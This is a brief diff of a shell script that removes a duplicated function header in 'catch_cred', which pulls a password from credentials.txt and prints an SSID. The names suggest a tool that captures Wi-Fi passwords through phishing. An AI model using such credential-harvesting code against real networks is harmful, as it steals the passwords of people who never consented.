@@ -151,7 +151,6 @@ start() {
 }
 
 catch_cred() {
-catch_cred() {
   IFS=$'\n'
   password=$(grep -o 'Pass:.*' credentials.txt | cut -d ":" -f2)
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m SSID:\e[0m\e[1;77m %s\n\e[0m" $use_ssid
